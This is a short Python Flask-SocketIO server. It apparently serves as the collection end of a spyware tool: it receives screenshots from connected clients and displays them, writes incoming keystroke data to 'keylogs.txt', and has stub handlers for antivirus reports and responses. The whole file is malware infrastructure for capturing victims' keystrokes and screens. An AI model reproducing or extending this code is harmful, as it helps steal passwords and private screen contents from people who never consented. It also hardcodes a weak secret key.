from flask import Flask, request
from flask_socketio import SocketIO, send, join_room, leave_room, rooms, disconnect
import json
from PIL import Image
import socketio


app = Flask(__name__)
app.config['SECRET_KEY'] = 'topsecret'
socketio = SocketIO(app)


    
    
@socketio.on('message')
def echo_message(msg):
    print(type(msg))


@socketio.on('connect')
def handle_connect():
    print("sid", request.sid, "connected")
   

@socketio.on('sc_snap')
def get_snaps(img_data):
    print("fn start")
    
    img = Image.frombytes(img_data['mode'], img_data['size'], img_data['image_data'])
    print(img)
    img.show()
    print("fn end")
    
@socketio.on('key_recorder')
def get_keylogs(recorder):
    with open('keylogs.txt', "r+") as kl:
        kl.write(recorder['data'])
    print(recorder['data'])
    
@socketio.on('response')
def gey_keylogs(user):
    pass
    

@socketio.on('antiviruses')
def get_antiviruses(room):
    pass


@socketio.on('disconnect')
def handle_disconnected_user():
    pass
    


if __name__ == '__main__':
    socketio.run(app, debug=True, log_output=False)
    
